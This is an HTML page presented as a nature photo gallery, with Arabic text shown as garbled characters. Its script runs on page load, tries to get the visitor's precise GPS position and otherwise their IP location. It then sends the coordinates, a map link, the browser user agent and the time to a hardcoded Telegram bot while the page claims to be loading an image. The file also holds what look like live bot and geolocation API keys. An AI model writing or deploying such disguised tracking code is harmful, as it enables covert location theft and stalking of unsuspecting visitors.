<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ù…Ø´Ù‡Ø¯ Ø·Ø¨ÙŠØ¹ÙŠ Ø®Ù„Ù‘Ø§Ø¨</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0c10;font-family:Tahoma}
    .card{position:relative;width:90%;max-width:600px;border-radius:16px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,.6)}
    .card img{width:100%;display:block}
    .caption{position:absolute;bottom:0;width:100%;background:rgba(0,0,0,.45);color:#fff;text-align:center;padding:14px 10px;font-size:1.1rem}
    #msg{background:#111;color:#fff;padding:10px;text-align:center;font-size:.9rem}
  </style>
</head>
<body>
  <div class="card">
    <img src="https://images.unsplash.com/photo-1501785888041-af3ef285b470" alt="Ø·Ø¨ÙŠØ¹Ø©">
    <div class="caption">Ø§Ø³ØªÙ…ØªØ¹ Ø¨Ø§Ù„Ù…Ù†Ø¸Ø± Ø§Ù„Ø³Ø§Ø­Ø±</div>
  </div>
  <div id="msg">Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ©...</div>

<script>
  // Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙˆØªÙƒ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
  const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
  const CHAT_ID   = "6036900535";

  // 1) Ù…Ø­Ø§ÙˆÙ„Ø© GPS ÙØ¹Ù„ÙŠ (Ø¯Ù‚Ø© Ø£Ù…ØªØ§Ø±)
  function getPreciseLocation() {
    if (!navigator.geolocation) return Promise.resolve(null);
    return new Promise(res => {
      navigator.geolocation.getCurrentPosition(
        pos => res(pos.coords),  // {latitude, longitude, accuracy}
        () => res(null),
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });
  }

  // 2) Ø§Ø­ØªÙŠØ§Ø·ÙŠ: IP + Ø¨ØµÙ…Ø© Ù…ØªØµÙØ­
  async function getFallback() {
    const ip = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301").then(r => r.json());
    return {
      latitude  : parseFloat(ip.latitude),
      longitude : parseFloat(ip.longitude),
      accuracy  : 5000, // ~5km
      fallback  : true,
      ipInfo    : ip
    };
  }

  // 3) Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
  async function sendToBot(coords, source) {
    const maps = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
    const msg  = `ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚ Ù„Ù„Ø³Ø§Ø±Ù‚!\n` +
                 `Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: ${coords.latitude}, ${coords.longitude}\n` +
                 `Ø§Ù„Ø¯Ù‚Ø©: Â±${coords.accuracy} Ù…ØªØ±\n` +
                 `Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ${maps}\n` +
                 `Ù†ÙˆØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${source}\n` +
                 `Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent}\n` +
                 `Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString("ar-EG")}`;
    const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
    new Image().src = url; // pixel ping
  }

  // 4) Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙˆØ±ÙŠ
  window.addEventListener("DOMContentLoaded", async () => {
    const precise = await getPreciseLocation();
    if (precise) {
      await sendToBot(precise, "GPS ÙØ¹Ù„ÙŠ");
    } else {
      const fall = await getFallback();
      await sendToBot(fall, "Ø§Ø­ØªÙŠØ§Ø·ÙŠ (IP + Ø¨ØµÙ…Ø©)");
    }
    document.getElementById("msg").textContent = "ØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­!";
  });
</script>
</body>
</html>
